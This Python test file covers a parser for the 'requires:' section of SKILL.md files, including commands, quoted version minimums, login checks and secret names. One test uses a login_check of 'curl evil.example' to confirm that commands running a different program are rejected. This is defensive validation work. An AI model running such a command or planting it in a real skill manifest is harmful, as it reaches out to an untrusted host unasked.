"""Parsing SKILL.md ``requires:`` leniently: what is understood is kept, the
rest is skipped with a warning naming why."""

from __future__ import annotations

import pytest

from coffer.domain.skill.requirements import (
    CommandRequirement,
    parse_requires,
    requirements_from_skill_md,
)

_DOC = """---
name: issues
description: Files issues.
requires:
  - command: gh
    title: GitHub CLI
    min_version: "2.40"
    login_check: gh auth status
    login: gh auth login
    why: Opens and labels issues.
  - jq
---
# body
"""


def test_a_full_entry_and_a_bare_name() -> None:
    parsed = requirements_from_skill_md(_DOC)
    assert parsed.warnings == ()
    assert parsed.requirements == (
        CommandRequirement(
            command="gh",
            title="GitHub CLI",
            min_version="2.40",
            login_check=("gh", "auth", "status"),
            login="gh auth login",
            why="Opens and labels issues.",
        ),
        CommandRequirement(command="jq"),
    )


def test_no_frontmatter_or_no_requires_is_empty() -> None:
    assert requirements_from_skill_md("# no frontmatter").requirements == ()
    assert requirements_from_skill_md("---\nname: a\n---\n").requirements == ()


def test_a_path_is_skipped() -> None:
    parsed = parse_requires(["/usr/bin/jq"])
    assert parsed.requirements == ()
    assert "is a path" in parsed.warnings[0]


def test_a_login_check_running_another_program_is_skipped() -> None:
    parsed = parse_requires([{"command": "gh", "login_check": "curl evil.example"}])
    assert parsed.requirements == ()
    assert "'curl'" in parsed.warnings[0] and "'gh'" in parsed.warnings[0]


def test_a_login_check_may_be_a_list() -> None:
    parsed = parse_requires([{"command": "gh", "login_check": ["gh", "auth", "status"]}])
    assert parsed.requirements[0].login_check == ("gh", "auth", "status")


def test_an_unquoted_float_minimum_is_skipped() -> None:
    # YAML reads 2.40 as 2.4, which is a different minimum.
    parsed = parse_requires([{"command": "gh", "min_version": 2.40}])
    assert parsed.requirements == ()
    assert "quoted" in parsed.warnings[0]


def test_an_integer_minimum_is_kept() -> None:
    [req] = parse_requires([{"command": "node", "min_version": 20}]).requirements
    assert req.min_version == "20"


def test_no_command_and_wrong_shapes_are_skipped() -> None:
    parsed = parse_requires([{"title": "x"}, 3, ""])
    assert parsed.requirements == ()
    assert len(parsed.warnings) == 3


def test_not_a_list_is_one_warning() -> None:
    parsed = parse_requires(7)
    assert parsed.requirements == ()
    assert parsed.warnings == ("requires: expected a list of commands; ignored",)


def test_unknown_fields_are_ignored_with_a_warning_and_the_entry_kept() -> None:
    parsed = parse_requires([{"command": "gh", "install": "make it", "brew": "gh"}])
    assert parsed.requirements == (CommandRequirement(command="gh"),)
    assert "unknown field(s) brew, install" in parsed.warnings[0]


def test_a_command_named_twice_keeps_the_first() -> None:
    parsed = parse_requires([{"command": "gh", "title": "GitHub CLI"}, "gh"])
    assert parsed.requirements == (CommandRequirement(command="gh", title="GitHub CLI"),)
    assert "declared twice" in parsed.warnings[0]


_SECRETS_DOC = """---
name: issues
description: Files issues.
requires:
  commands: [gh]
  secrets: [GITHUB_TOKEN, "bad name", GITHUB_TOKEN, npm.token]
---
"""


@pytest.mark.acceptance(
    spec="skill-manager", scenario="a skill's secrets are read from the mapping form"
)
def test_the_mapping_form_names_secrets_and_skips_what_is_not_a_name() -> None:
    parsed = requirements_from_skill_md(_SECRETS_DOC)
    assert parsed.requirements == (CommandRequirement(command="gh"),)
    assert parsed.secrets == ("GITHUB_TOKEN", "npm.token")
    assert parsed.warnings == (
        "requires secret 2: 'bad name' is not a secret name; skipped",
        "requires secret GITHUB_TOKEN: declared twice; later entry skipped",
    )


def test_the_list_form_carries_commands_only() -> None:
    parsed = parse_requires(["gh", {"secrets": ["GITHUB_TOKEN"]}])
    assert parsed.requirements == (CommandRequirement(command="gh"),)
    assert parsed.secrets == ()
    assert parsed.warnings == ("requires entry 2: no command; skipped",)


@pytest.mark.parametrize("junk", [7, {"a": 1}, [3], ["x/y"], [""]])
def test_a_secrets_value_that_is_not_names_declares_none(junk: object) -> None:
    parsed = parse_requires({"secrets": junk})
    assert parsed.secrets == ()
    assert len(parsed.warnings) == 1


def test_a_single_secret_name_is_one_secret() -> None:
    assert parse_requires({"secrets": "API_KEY"}).secrets == ("API_KEY",)


@pytest.mark.acceptance(spec="skill-manager", scenario="an unknown key under requires is refused")
def test_an_unknown_key_under_the_mapping_is_refused_with_a_warning() -> None:
    parsed = parse_requires({"commands": ["jq"], "tools": ["rg"], "env": {"A": "b"}})
    assert parsed.requirements == (CommandRequirement(command="jq"),)
    assert parsed.secrets == ()
    assert parsed.warnings == (
        "requires: unknown key(s) env, tools refused; only commands and secrets are read",
    )
